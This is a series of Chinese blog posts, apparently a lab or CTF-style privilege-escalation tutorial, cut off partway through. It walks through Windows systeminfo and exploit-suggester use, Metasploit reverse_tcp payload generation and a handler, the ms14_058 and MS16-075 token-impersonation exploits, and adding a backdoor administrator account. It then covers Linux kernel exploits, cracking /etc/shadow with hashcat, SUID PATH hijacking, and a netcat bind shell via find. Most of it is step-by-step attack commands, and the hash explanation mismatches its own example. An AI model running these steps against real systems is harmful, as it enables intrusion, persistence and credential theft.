<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">主机名:           WIN-TP3JBOH7FVB</span><br><span class="line">OS 名称:          Microsoft Windows Server 2012 R2 Datacenter</span><br><span class="line">OS 版本:          6.3.9600 暂缺 Build 9600</span><br><span class="line">OS 制造商:        Microsoft Corporation</span><br><span class="line">OS 配置:          独立服务器</span><br><span class="line">OS 构件类型:      Multiprocessor Free</span><br><span class="line">注册的所有人:     Windows 用户</span><br><span class="line">注册的组织:       </span><br><span class="line">产品 ID:          00253-50000-00000-AA094</span><br><span class="line">初始安装日期:     2021&#x2F;1&#x2F;23, 15:57:09</span><br><span class="line">系统启动时间:     2021&#x2F;5&#x2F;20, 10:33:03</span><br><span class="line">系统制造商:       Dell Inc.</span><br><span class="line">系统型号:         PowerEdge R630</span><br><span class="line">系统类型:         x64-based PC</span><br><span class="line">处理器:           安装了 2 个处理器。</span><br><span class="line">                  [01]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~2400 Mhz</span><br><span class="line">                  [02]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~2400 Mhz</span><br><span class="line">BIOS 版本:        Dell Inc. 2.11.0, 2019&#x2F;11&#x2F;2</span><br><span class="line">Windows 目录:     C:\Windows</span><br><span class="line">系统目录:         C:\Windows\system32</span><br><span class="line">启动设备:         \Device\HarddiskVolume1</span><br><span class="line">系统区域设置:     zh-cn;中文(中国)</span><br><span class="line">输入法区域设置:   暂缺</span><br><span class="line">时区:             (UTC+08:00)北京，重庆，香港特别行政区，乌鲁木齐</span><br><span class="line">物理内存总量:     65,442 MB</span><br><span class="line">可用的物理内存:   35,259 MB</span><br><span class="line">虚拟内存: 最大值: 99,554 MB</span><br><span class="line">虚拟内存: 可用:   62,747 MB</span><br><span class="line">虚拟内存: 使用中: 36,807 MB</span><br><span class="line">页面文件位置:     C:\pagefile.sys</span><br><span class="line">域:               WORKGROUP</span><br><span class="line">登录服务器:       暂缺</span><br><span class="line">修补程序:         安装了 6 个修补程序。</span><br><span class="line">                  [01]: KB2919355</span><br><span class="line">                  [02]: KB2919442</span><br><span class="line">                  [03]: KB2999226</span><br><span class="line">                  [04]: KB3045563</span><br><span class="line">                  [05]: KB3045596</span><br><span class="line">                  [06]: KB4054566</span><br><span class="line">网卡:             安装了 4 个 NIC。</span><br><span class="line">                  [01]: Intel(R) Gigabit 4P I350-t rNDC</span><br><span class="line">                      连接名:      NIC2</span><br><span class="line">                      状态:        媒体连接已中断</span><br><span class="line">                  [02]: Intel(R) Gigabit 4P I350-t rNDC</span><br><span class="line">                      连接名:      NIC1</span><br><span class="line">                      启用 DHCP:   否</span><br><span class="line">                      IP 地址</span><br><span class="line">                        [01]: 218.95.37.171</span><br><span class="line">                        [02]: fe80::e4ed:dc1:c4e6:7b2b</span><br><span class="line">                  [03]: Intel(R) Gigabit 4P I350-t rNDC</span><br><span class="line">                      连接名:      NIC4</span><br><span class="line">                      状态:        媒体连接已中断</span><br><span class="line">                  [04]: Intel(R) Gigabit 4P I350-t rNDC</span><br><span class="line">                      连接名:      NIC3</span><br><span class="line">                      状态:        媒体连接已中断</span><br><span class="line">Hyper-V 要求:     虚拟机监视器模式扩展: 是</span><br><span class="line">                  固件中已启用虚拟化: 是</span><br><span class="line">                  二级地址转换: 是</span><br><span class="line">                  数据执行保护可用: 是</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210823115235178.png" alt="image-20210823115235178"></p>
</blockquote>
<p>接着就可以直接索引可提权的方式了</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">./windows-exploit-suggester.py  --database 2021-08-22-mssb.xls --systeminfo 1.txt</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210823115910637.png" alt="image-20210823115910637"></p>
<p>这里只是提供一种方式，能不能提权成功并不能确定</p>
<p>也可以查询指定系统未打补丁的。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">./windows-exploit-suggester.py  --database 2021-08-22-mssb.xls --ostext 'windows server 8'</span><br></pre></td></tr></table></figure></div>

<p>还有一个</p>
<p><a href="https://github.com/mzet-/linux-exploit-suggester" target="_blank" rel="noopener">linux-exploit-Suggester</a>自己看看</p>
<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：https-gylq-gitee-io"><a href="#孤桜懶契：https-gylq-gitee-io" class="headerlink" title="孤桜懶契：https://gylq.gitee.io"></a>孤桜懶契：<a href="https://gylq.gitee.io">https://gylq.gitee.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>CTF</category>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>黑客工具</tag>
        <tag>提权</tag>
        <tag>扫描工具</tag>
      </tags>
  </entry>
  <entry>
    <title>【提权】metasploit提权方法</title>
    <url>/posts/110.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<ul>
<li>metasploit 提权使用</li>
</ul>
</blockquote>
<p>常用的提权模块</p>
<p>metasploit 提权EXP存储文件夹路径</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -name metasploit</span><br><span class="line"></span><br><span class="line">一般都在</span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;modules&#x2F;exploits&#x2F;windows&#x2F;local</span><br></pre></td></tr></table></figure></div>

<h1 id="windows2003提权"><a href="#windows2003提权" class="headerlink" title="windows2003提权"></a>windows2003提权</h1><blockquote>
<p>环境：2003 server</p>
</blockquote>
<p><strong>1、生成攻击载荷</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.108 lport=6666 -f exe &gt; payload.exe</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210822161830954.png" alt="image-20210822161830954"></p>
</blockquote>
<p><strong>2、接着在kali中运行msfconsole执行下面命令来监听</strong>（玩过msf应该都很熟悉）</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set lhost 192.168.0.108</span><br><span class="line">set lport 6666</span><br><span class="line">run</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210822162342445.png" alt="image-20210822162342445"></p>
</blockquote>
<p><strong>3、首先去虚拟机中确认生成payload是否有用，发现得到session，可以去受害机进行执行获取session</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210822162555846.png" alt="image-20210822162555846"></p>
</blockquote>
<p><strong>4、受害机已经获得shell了，然后上传这个payload去一个可读可写的目录，然后进行运行就可以拿到session，我直接用大马执行</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210822162940476.png" alt="image-20210822162940476"></p>
</blockquote>
<p>但是拿到的权限很低，接下来我们想办法上的system权限，但是getsystem/getprivs并不能在这里轻松提权</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210822163247489.png" alt="image-20210822163247489"></p>
</blockquote>
<p>5、<strong>接着用post里面的模块multi检测该系统可利用的提权模块</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">run post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210822164314210.png" alt="image-20210822164314210"></p>
</blockquote>
<p><strong>可以发现有很多，我们随便选一个ms14_058的吧，先background收起sessions，然后再进行利用</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">background</span><br><span class="line">use exploit/windows/local/ms14_058_track_popup_menu</span><br></pre></td></tr></table></figure></div>

<p><strong>先看看sess的id以确定利用时所选的set</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">session -l 查看id</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210822164556586.png" alt="image-20210822164556586"></p>
</blockquote>
<p><strong>然后set session 1</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210822164621415.png" alt="image-20210822164621415"></p>
</blockquote>
<p><strong>接着提权成功，很自动化，很无脑提权到最高权限</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210822164659711.png" alt="image-20210822164659711"></p>
</blockquote>
<h4 id="一些基础命令的使用和记录"><a href="#一些基础命令的使用和记录" class="headerlink" title="一些基础命令的使用和记录"></a>一些基础命令的使用和记录</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">ps 查看pid</span><br><span class="line">migrate 3420 注入进程维持后门 这样每次系统启动都会连接服务器</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210822210706115.png" alt="image-20210822210706115"></p>
</blockquote>
<p>接着常规操作，有系统权限，增加用户</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">shell 进入cmd命令操作</span><br><span class="line">net user gylq gylq &#x2F;add &amp; net localgroup administrators gylq &#x2F;add 增加超级管理员</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210822211238723.png" alt="image-20210822211238723"></p>
</blockquote>
<p>对方在公网的话，直接登3389，kali的话用</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">rdesktop 192.168.0.115</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210822211628791.png" alt="image-20210822211628791"></p>
</blockquote>
<h2 id="在介绍一下ms16-075的提权方法"><a href="#在介绍一下ms16-075的提权方法" class="headerlink" title="在介绍一下ms16-075的提权方法"></a><strong>在介绍一下ms16-075的提权方法</strong></h2><p><strong>还是回到普通权限</strong></p>
<p><strong>1、伪造身份</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">use incognito</span><br><span class="line">list_tokens -u &#x2F;&#x2F;查看当前伪造的身份</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210823131003045.png" alt="image-20210823131003045"></p>
</blockquote>
<p>2、执行一下ms075的<a href="https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-075/potato.exe" target="_blank" rel="noopener">potato.exe</a>其实，上面已经显示可以提权了</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">execute -cH -f C:&#x2F;RECYCLER&#x2F;potato.exe</span><br></pre></td></tr></table></figure></div>

<p>3、直接伪造系统身份</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210823132854144.png" alt="image-20210823132854144"></p>
</blockquote>
<h1 id="记录一些msf在centos安装采坑"><a href="#记录一些msf在centos安装采坑" class="headerlink" title="记录一些msf在centos安装采坑"></a>记录一些msf在centos安装采坑</h1><p><strong>安装msf的具体命令如下</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">curl https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;rapid7&#x2F;metasploit-omnibus&#x2F;master&#x2F;config&#x2F;templates&#x2F;metasploit-framework-wrappers&#x2F;msfupdate.erb &gt; msfinstall</span><br></pre></td></tr></table></figure></div>

<p><strong>接着本地出现msfinstall,然后给权限和安装</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">chmod 755 msfinstall</span><br><span class="line"></span><br><span class="line">.&#x2F;msfinstall &#x2F;&#x2F;就可以直接启动了</span><br></pre></td></tr></table></figure></div>

<p><strong>msf卸载方法（出现故障使用）</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">yum remove metasploit-framework</span><br></pre></td></tr></table></figure></div>

<p>msfupdate之后需要进行环境变量配置</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">export PATH="/opt/metasploit-framework/bin:$PATH"</span><br></pre></td></tr></table></figure></div>



<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-gitee-io"><a href="#孤桜懶契：http-gylq-gitee-io" class="headerlink" title="孤桜懶契：http://gylq.gitee.io"></a>孤桜懶契：<a href="http://gylq.gitee.io">http://gylq.gitee.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>CTF</category>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>黑客工具</tag>
        <tag>Metasploit</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>【提权】Linux提权方法</title>
    <url>/posts/108.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<ul>
<li>Linux提权方法，环境是你已经拿到了一个linux的webshell</li>
</ul>
</blockquote>
<h1 id="Linux-15-04提权"><a href="#Linux-15-04提权" class="headerlink" title="Linux 15.04提权"></a>Linux 15.04提权</h1><p>首先用<a href="https://github.com/pentestmonkey/perl-reverse-shell" target="_blank" rel="noopener">perl-reverse-shell.pl</a>来反弹shell到本地，由于是本地测试，所以ip就填自己本地的ip，接着本地nc -vvlp 1234，shell中执行下面命令，windows中就得到一个shell 了</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210820213833181.png" alt="image-20210820213833181"></p>
</blockquote>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210820213904244.png" alt="image-20210820213904244"></p>
</blockquote>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">查看发行版</span><br><span class="line">cat &#x2F;etc&#x2F;issue</span><br><span class="line">cat &#x2F;etc&#x2F;*release</span><br><span class="line"></span><br><span class="line">查看内核版本</span><br><span class="line">uname -a</span><br></pre></td></tr></table></figure></div>

<h3 id="查找可用的提权-exp"><a href="#查找可用的提权-exp" class="headerlink" title="查找可用的提权 exp"></a>查找可用的提权 exp</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">内核：Linux moonteam-virtual-machine 3.19.0-15-generic #15-Ubuntu SMP Thu Apr 16 23:32:37 UTC 2015 x86_64 x86_64 x86_64 GNU&#x2F;Linux</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><a href="https://www.exploit-db.com/" target="_blank" rel="noopener">https://www.exploit-db.com/</a></p>
</blockquote>
<p>通过内核可以查到可利用的exp</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210820214756808.png" alt="image-20210820214756808"></p>
</blockquote>
<p>将其保存为15.04.c</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210820215055935.png" alt="image-20210820215055935"></p>
</blockquote>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>用gcc 15.04.c -o exp</p>
<p>然后在webshell中运行提权成功！</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210820215910369.png" alt="image-20210820215910369"></p>
</blockquote>
<p>由于这个窗口不好用，所以切换一下shell</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br><span class="line"></span><br><span class="line">形成</span><br><span class="line">root@mvirtur-virtual-machine:&#x2F;var&#x2F;www&#x2F;html&#x2F;upload#</span><br></pre></td></tr></table></figure></div>

<p><strong>可以直接访问/etc/shadow查看密文了</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210820221241320.png" alt="image-20210820221241320"></p>
</blockquote>
<p>这时，问题来了，我们知道了密文该如何解密呢</p>
<h2 id="hashcat解密利用"><a href="#hashcat解密利用" class="headerlink" title="hashcat解密利用"></a>hashcat解密利用</h2><p>当前的Linux系统出于安全性考虑，etc/passwd 文件中并没有存储Linux用户的密码信息，而是转移到了/etc/shadow文件下，又称为“影子文件”。该文件只有root用户才能read权限，其他用户无权查看，使密码泄露风险降低。同时shadow文件中存储的密码采用SHA512散列加密，相比较原始的MD5，加密等级更高。</p>
<p>shadow文件密码存储格式：<code>$id$salt$encrypted$</code></p>
<p><strong><em>id代表使用的加密算法：</em></strong></p>
<table>
<thead>
<tr>
<th>id</th>
<th>Method</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>MD5</td>
</tr>
<tr>
<td>2a</td>
<td>Blowfish(not in mainline glibc;added in some Linux distribution)</td>
</tr>
<tr>
<td>5</td>
<td>SHA-256(since glibc 2.7)</td>
</tr>
<tr>
<td>6</td>
<td>SHA-512(since glibc 2.7)</td>
</tr>
</tbody></table>
<p> <strong><em>salt是长度1-16字符的随机数，随机数的引入增大了破解难度\</em></strong></p>
<p><strong><em>encrypted是最终的密文，即通过加密算法和salt（盐参）计算的最终结果\</em></strong></p>
<p>实例：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">$6$JmlEMUxK$1z4jAyPW9M10W4c6T79ly1yO38S9dXWLdj.gflDVsqj4DkhBTMBjLd8u7q5GD4B.SXa4smGrsXZxwJtPNHfRe0</span><br></pre></td></tr></table></figure></div>

<p>解析：该shadow文件显示，使用加密算法为SHA-512，随机数（salt）为PUehV6sk，加密密钥为Y1ctlOYUyKJMO868w7C78xeCvkGz4R7M73Hs6cg.IsMSN.2QryqCbbno5wvklwHn4is//ibMQA0TIWiledmp80</p>
<p><strong>Hashcat工具的使用可以去看我的相关文章，这里只介绍命令</strong></p>
<p>参数标准语句：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">hashcat  -a 0 -m &lt;加密模式&gt; &lt;shadow文本.txt&gt; &lt;密码文本.txt&gt; -o 输出文本.txt</span><br></pre></td></tr></table></figure></div>

<p>这里由于我已知道密码有几位，所以采用掩码形式</p>
<table>
<thead>
<tr>
<th>3800</th>
<th>md5($salt.$pass.$salt)</th>
</tr>
</thead>
<tbody><tr>
<td>3710</td>
<td>md5($salt.md5($pass))</td>
</tr>
<tr>
<td>4010</td>
<td>md5($salt.md5($salt.$pass))</td>
</tr>
<tr>
<td>1800</td>
<td>sha512crypt $6$, SHA512 (Unix)</td>
</tr>
</tbody></table>
<p>操作步骤</p>
<p>1、将shadow.txt中放于密文</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210821075746124.png" alt="image-20210821075746124"></p>
</blockquote>
<p><strong>2、命令执行</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">hashcat -a 3 -m 1800 shadow.txt --increment --increment-min 5 --increment-max 6 ?d?d?d?d?d?d</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210821080443790.png" alt="image-20210821080443790"></p>
</blockquote>
<p>如果想要他输出的话加一个命令</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">hashcat -a 3 -m 1800 shadow.txt --increment --increment-min 5 --increment-max 6 ?d?d?d?d?d?d -o result.txt</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210821080559453.png" alt=""></p>
</blockquote>
<h1 id="Linux-SUID提权"><a href="#Linux-SUID提权" class="headerlink" title="Linux SUID提权"></a>Linux SUID提权</h1><p>首先演示一遍，假设root用户创建了一个suid.c文件为以下代码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">#include&lt;unistd.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">setuid(0);&#x2F;&#x2F;run as root</span><br><span class="line">system(&quot;id&quot;);</span><br><span class="line">system(&quot;cat &#x2F;etc&#x2F;shadow&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210821094758885.png" alt="image-20210821094758885"></p>
</blockquote>
<p>接着gcc编译一下<code>gcc suid.c -o suid-exp</code>，然后给它一个suid的文件属性<code>chmod 4777 suid-exp</code></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210821095032678.png" alt="image-20210821095032678"></p>
</blockquote>
<p>接着运行一下看看结果，发现可以运行/etc/shadow文件</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210821095056561.png" alt="image-20210821095056561"></p>
</blockquote>
<p>接着进入普通用户开始实战，普通用户无法访问shadow</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210821095145462.png" alt="image-20210821095145462"></p>
</blockquote>
<p>但是可以执行刚刚root用户创建的suid-exp文件<code>./suid-exp</code></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210821095218753.png" alt="image-20210821095218753"></p>
</blockquote>
<p>所以就可以想着劫持这个cat命令来执行/bin/bash，不过像suid这种文件可以利用find找出来全部</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><strong><img src="https://gylq.gitee.io/cloudimages/img/image-20210821095414249.png" alt="image-20210821095414249"></strong></p>
</blockquote>
<h3 id="劫持环境变量提权"><a href="#劫持环境变量提权" class="headerlink" title="劫持环境变量提权"></a>劫持环境变量提权</h3><p>因为System函数是继承环境变量，可以通过替换环境变量达到执行任意命令。</p>
<p>在当前/tep中创建一个文件</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">echo "/bin/bash" &gt; cat &amp;&amp; chmod 777 cat</span><br></pre></td></tr></table></figure></div>

<p>当前目录中的cat它会执行一个shell</p>
<p>查看当前环境变量<code>echo $PATH</code></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210821100017254.png" alt="image-20210821100017254"></p>
</blockquote>
<p>接着将tmp目录增加到环境变量</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">export PATH=.:$PATH</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210821100512143.png" alt="image-20210821100512143"></p>
</blockquote>
<p>接着执行/tmp/suid-exp，就成功劫持为root权限</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210821100709750.png" alt="image-20210821100709750"></p>
</blockquote>
<p>在说一个find，假如find也被设置了suid，我们可以利用find提权，首先看看是否存在find</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">touch sky</span><br><span class="line">find sky -exec whoami \;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210821104757553.png" alt="image-20210821104757553"></p>
</blockquote>
<p>前提是有nc，发现是root权限，接着将这个shell打开</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">find sky -exec netcat -lvp 5555 -e &#x2F;bin&#x2F;sh \;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210821111906458.png" alt="image-20210821111906458"></p>
</blockquote>
<p>结果nc版本太低，没有-e这个命令无法传递shell，没办法，那就下一个版本高的nc吧，开整</p>
<p><strong>1、wget下一个tar压缩的nc</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">wget  http://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gz/download -O netcat-0.7.1.tar.gz</span><br></pre></td></tr></table></figure></div>

<p><strong>2、解压文件</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">tar zxvf netcat-0.7.1.tar.gz</span><br></pre></td></tr></table></figure></div>

<p><strong>3、解压完毕会生成目录</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">cd netcat-0.7.1</span><br></pre></td></tr></table></figure></div>

<p><strong>4、配置环境</strong></p>
